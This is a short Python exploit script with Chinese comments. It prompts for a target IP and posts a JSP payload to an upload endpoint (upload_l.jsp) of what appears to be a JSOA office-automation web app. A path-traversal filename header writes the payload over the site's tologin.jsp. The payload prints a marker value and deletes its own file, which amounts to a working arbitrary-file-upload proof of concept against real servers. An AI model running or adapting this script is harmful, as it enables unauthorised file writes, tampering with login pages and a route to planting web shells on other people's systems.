import requests

def send_request(host):
    url = f"http://{host}/jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1"  # 替换为实际的目标主机

    # 请求头
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "filename": "/../../tologin.jsp",  # 这里是文件名
    }

    # 请求体
    data = """<%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"""

    try:
    # 发送POST请求
        response = requests.post(url, headers=headers, data=data)

    # 输出响应内容
        print("Response Code:", response.status_code)
        print("Response Body:", response.text)

    except requests.exceptions.RequestException as e:
         print("An error occurred:", e)
if __name__ == '__main__':
    # 输入目标主机
    target_host = input("输入目标ip: ")
    send_request(target_host)
